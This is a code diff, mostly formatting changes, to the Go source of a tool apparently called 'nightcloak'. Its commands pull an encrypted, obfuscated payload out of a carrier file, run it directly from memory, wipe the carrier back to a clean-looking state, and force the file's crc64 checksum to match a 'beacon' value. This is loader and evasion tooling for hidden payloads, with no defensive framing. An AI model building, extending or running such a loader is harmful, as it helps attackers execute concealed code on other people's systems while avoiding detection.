@@ -228,22 +228,22 @@ func cmdReveal(args []string) {
 		}
 		log("Extracted to %s (%d bytes)", output, len(clearBytes))
 	} else {
-	        os.Stdout.Write(clearBytes)
+		os.Stdout.Write(clearBytes)
 	}
-	}
+}
 
-	// ---------------------------------------------------------------------------
-	// exec: extract → decrypt → dreamify → in-memory execution
-	// ---------------------------------------------------------------------------
+// ---------------------------------------------------------------------------
+// exec: extract → decrypt → dreamify → in-memory execution
+// ---------------------------------------------------------------------------
 
-	func cmdExec(args []string) {
+func cmdExec(args []string) {
 	var password string
 	args = parseFlags(args, map[string]*string{
-	        "-p": &password, "--password": &password,
+		"-p": &password, "--password": &password,
 	}, map[string]*bool{})
 
 	if len(args) < 1 {
-	        die("usage: nightcloak exec <carrier> [-- <args...>]")
+		die("usage: nightcloak exec <carrier> [-- <args...>]")
 	}
 
 	carrierPath := args[0]
@@ -253,7 +253,7 @@ func cmdReveal(args []string) {
 	// Step 1: Extract via cloak.
 	result, err := cloak.Reveal(carrierPath, password)
 	if err != nil {
-	        die("extraction failed: %v", err)
+		die("extraction failed: %v", err)
 	}
 
 	raw := result.Payload
@@ -261,37 +261,37 @@ func cmdReveal(args []string) {
 	// Step 2: Strip optional secondary XChaCha20 layer (KEY env var).
 	xkey, err := crypto.ResolveXKey()
 	if err != nil {
-	        die("KEY resolution failed: %v", err)
+		die("KEY resolution failed: %v", err)
 	}
 	if xkey != nil {
-	        raw, err = crypto.XDecrypt(raw, xkey)
-	        if err != nil {
-	                die("secondary decryption failed: %v", err)
-	        }
+		raw, err = crypto.XDecrypt(raw, xkey)
+		if err != nil {
+			die("secondary decryption failed: %v", err)
+		}
 	}
 
 	// Step 3: Primary decrypt (ChaCha20-Poly1305 + PBKDF2).
 	decrypted, err := crypto.Decrypt(raw, password)
 	if err != nil {
-	        die("decryption failed: %v", err)
+		die("decryption failed: %v", err)
 	}
 
 	// Step 4: Dreamify (de-obfuscate).
 	clearBytes, err := nightmare.DreamifyBytes(string(decrypted))
 	if err != nil {
-	        die("de-obfuscation failed: %v", err)
+		die("de-obfuscation failed: %v", err)
 	}
 
 	// Step 5: Execute directly from memory.
 	log("Executing payload in-memory...")
 	if err := native.MemExec(clearBytes, execArgs); err != nil {
-	        die("in-memory execution failed: %v", err)
+		die("in-memory execution failed: %v", err)
 	}
-	}
+}
 
-	// ---------------------------------------------------------------------------
-	// wipe: remove embedded payload, restore carrier to clean state
-	// ---------------------------------------------------------------------------
+// ---------------------------------------------------------------------------
+// wipe: remove embedded payload, restore carrier to clean state
+// ---------------------------------------------------------------------------
 
 func cmdWipe(args []string) {
 	var password string
@@ -313,9 +313,9 @@ func cmdWipe(args []string) {
 	log("Payload removed from %s", carrierPath)
 }
 
-	// ---------------------------------------------------------------------------
-	// inspect: show file metadata tags
-	// ---------------------------------------------------------------------------
+// ---------------------------------------------------------------------------
+// inspect: show file metadata tags
+// ---------------------------------------------------------------------------
 func cmdInspect(args []string) {
 	if len(args) < 1 {
 		die("usage: nightcloak inspect <file>")
@@ -509,8 +509,11 @@ func cmdSplit(args []string) {
 		distributed, total, minRequired)
 }
 
-/* appendBeaconAlignment reads the carrier file at path, computes the 8-byte
-forced-match suffix, and appends it so that crc64(file) == beacon target. */
+/*
+	appendBeaconAlignment reads the carrier file at path, computes the 8-byte
+
+forced-match suffix, and appends it so that crc64(file) == beacon target.
+*/
 func appendBeaconAlignment(path, password string) error {
 	data, err := os.ReadFile(path)
 	if err != nil {
